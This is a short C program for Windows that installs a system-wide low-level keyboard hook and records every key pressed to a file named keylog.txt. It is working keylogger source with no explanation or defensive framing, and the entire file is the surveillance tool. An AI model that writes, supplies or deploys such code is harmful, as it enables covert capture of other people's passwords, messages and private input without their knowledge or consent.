#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

FILE *log_file;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            fprintf(log_file, "%c", pKeyboard->vkCode);
            fflush(log_file);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    log_file = fopen("keylog.txt", "w");
    if (log_file == NULL) {
        MessageBox(NULL, "Unable to open log file.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook == NULL) {
        MessageBox(NULL, "Unable to install hook.", "Error", MB_OK | MB_ICONERROR);
        fclose(log_file);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(log_file);
    return 0;
}
